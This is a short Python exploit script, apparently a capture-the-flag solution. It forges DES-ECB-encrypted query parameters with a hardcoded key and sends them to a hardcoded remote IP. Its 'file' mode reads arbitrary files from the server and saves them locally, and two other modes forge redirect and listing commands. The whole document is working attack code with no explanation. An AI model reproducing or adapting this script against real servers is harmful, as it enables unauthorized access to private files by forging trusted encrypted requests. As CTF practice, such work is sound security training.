from Crypto.Cipher import DES
import requests
import sys
import os
import urllib

mode = sys.argv[1]

host = "http://13.115.255.46/"
# host = "http://localhost:1337/"
key = "megnnaro"

cipher = DES.new(key, DES.MODE_ECB)

if mode == "file":
	path = sys.argv[2]

	query = "m=d&f={}".format(path)
	padding = 8 - (len(query) % 8)
	query += (chr(padding)) * padding

	query = cipher.encrypt(query).hex()

	r = requests.get("{}?s={}".format(host, query))

	# os.makedirs(os.path.dirname(path), exist_ok=True)
	path = os.path.basename(path)

	with open(path, "wb") as f:
		f.write(r.content)
elif mode == "redir":
	uid = sys.argv[2]

	query = urllib.parse.urlencode({ "m": "r", "u": uid, "t": "whatever"})

	padding = 8 - (len(query) % 8)
	query += (chr(padding)) * padding

	query = cipher.encrypt(query).hex()

	r = requests.get("{}?s={}".format(host, query))

	print(r.text)
elif mode == "list":
	amt = sys.argv[2]

	query = urllib.parse.urlencode({ "m": "p", "l": amt})

	padding = 8 - (len(query) % 8)
	query += (chr(padding)) * padding

	query = cipher.encrypt(query).hex()

	r = requests.get("{}?s={}".format(host, query))

	print(r.text)